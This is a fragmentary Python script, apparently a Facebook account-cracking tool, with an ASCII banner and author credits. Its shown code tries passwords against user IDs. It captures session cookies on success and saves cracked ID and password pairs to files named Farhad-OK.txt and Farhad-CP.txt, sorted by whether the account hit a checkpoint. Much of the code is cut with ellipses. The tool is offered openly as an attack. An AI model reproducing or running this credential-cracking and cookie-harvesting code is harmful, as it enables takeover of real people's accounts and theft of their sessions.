...
logo=("""                  
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[1;97m  d8888b. db       .d88b.   .o88b. db   dD 
\033[1;97m  88  `8D 88      .8P  Y8. d8P  Y8 88 ,8P' 
\033[0;31m  88oooY' 88      88    88 8P      88,8P   
\033[0;31m  88~~~b. 88      88    88 8b      88`8b   
\033[1;97m  88   8D 88booo. `8b  d8' Y8b  d8 88 `88. 
\033[1;97m  Y8888P' Y88888P  `Y88P'   `Y88P' YP   dD                                     \033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;97m   [ \33[0;41m WORKING MOBILE DATA AND WIFI ALSO \33[0;97m ] \033[0;92m                                  ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR        : Farhad_Badakhsh_R-Massih
╠══[FACEBOOK      : Farhad_Badakhsh_R-Massih
╠══[GITHUB        : Farhad_Badakhsh190
╠══[REGIONAL      : AFGHANISTAN
╠══[TOOLS         : FREE
╠══[VERSION       : 0.2\033[1;31m
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")  
def lines():
	print('\33[1;37m----------------------------------------------')
...
def riaz():
	...
	if riaz1 =='0':
		exit()
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100004889412068')
	if riaz1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[BLOCK-OK] '+uid+' | '+ps+'\033[0;97m\n[‎‎🍪]\033[0;32m COOKIE = \033[1;31m'+coki+  '  ''  \033[0;97m')
                open('Farhad-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[Farhad-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Farhad-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
